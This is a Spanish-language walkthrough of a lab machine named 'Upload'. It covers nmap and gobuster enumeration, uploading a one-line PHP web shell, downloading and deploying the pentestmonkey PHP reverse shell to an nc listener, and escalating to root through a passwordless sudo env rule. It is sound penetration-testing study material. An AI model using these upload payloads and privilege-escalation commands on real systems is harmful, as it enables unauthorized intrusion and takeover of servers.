# Máquina Upload

Lo primero es desplegar la máquina virtual con el siguiente comando.
```
bash auto_deploy.sh upload.tar
```

Realizamos el escaneo de puertos con el siguiente comando.
```
nmap -sSCV -n -Pn --min-rate 5000 -p- --open [IP]
```

- Resultado
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-08 20:48 CEST
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 65534 closed tcp ports (reset)
PORT STATE SERVICE VERSION
80/tcp open http    Apache httpd 2.4.52 ((Ubuntu))
_http-title: Upload here your file
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 ( Unknown)
```
Podemos ver que usa un servidor apache y el puerto 80 está abierto, con lo cual podemos deducir que es una página web.

El siguiente paso es ejecutar el siguiente comando.
```
whatweb [IP]
```

- Resultado
```
http://172.17.0.2 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[172.17.0.2], Title[Upl
oad here your file]
```
Una vez realizado podemos poner la ip en el buscador.

# Fuzzing
Ahora vamos a usar la herramienta gobuster para encontrar archivos, directorios....
```
sudo gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.html,.sh,.py -u "http://172.17.0.2/"
```
-Resultado
```
Starting gobuster in directory enumeration mode

/.html                (Status: 403) [Size: 275]
/ .php                (Status: 403) [Size: 275]
/index.html            (Status: 200) [Size: 1361]
/uploads              (Status: 301) [Size: 310] [ -- > http://172.17.0.2/uploads/]
/upload.php           (Status: 200) [Size: 1357]
/ .php                (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1102800 / 1102805 (100.00%)
```
El resultado nos indica que debemos entrar al directorio upload de la página.
Y nos saldrá una página para subir un archivo, lo cual nos indica que tendremos que hacer un archivo para la Reverse shell.

# Reverse Shell
Creamos un archivo php para realizar la Reverse shell, el cual contendrá este código.
El cual mediante este código php, se ejecutar un comando especificado en la variable (cmd).  
```
<?php
  system($_GET['cmd']);
?>
```
Una vez que subimos el archivo, si vamos al directorio de (172.17.0.2/uploads)
Podremos ver el archivo que acabamos de subir.

Una vez que el archivo está subido podemos comprobar que funciona pasando un parámetro a la variable (cmd)
```
172.17.0.2/uploads/revers.php?cmd=id
```

Resultado
Con lo cual tenemos ejecución de comandos
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Nos descargamos el archivo php-reverse-shell y lo vamos a editar para nuestro uso.
```
wget https://raw.githubusercontent. com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```
En cada caso hay que modificar la IP y el puerto de escucha.

Una vez realizado esto, nos ponemos en modo escucha mediante el comando este comando.
```
nc -lvnp 4444
```
Ahora subimos el archivo php-reverse-shell y lo ejecutamos como hicimos con el primer archivo que creamos.
Ejemplo
```
172.17.0.2/uploads/(Nombre del archivo a ejecutar)
```

Una vez ejecutado, volvemos a la terminal donde ejecutamos el script de escucha y vemos que ya estamos dentro.

# Tratamiento de la terminal

Ejecutamos el siguiente comando
```
script /dev/null -c bash
```

# Escalar Privilegios

Ejecutamos el siguiente comando para comprobar lo que podemos hacer.
```
sudo -l
```
Resultado
Lo que podemos usar es el comando env como root y no necesita contraseña
```
User www-data may run the following commands on 570b35d558d5:
(root) NOPASSWD: /usr/bin/env
```

Entonces para realizar la escalada a root debemos ejecutar el siguiente comando, donde permite que el binario se ejecute como superusuario
```
sudo /usr/bin/env /bin/bash
```
Una vez ejecutado ya somos root!!!
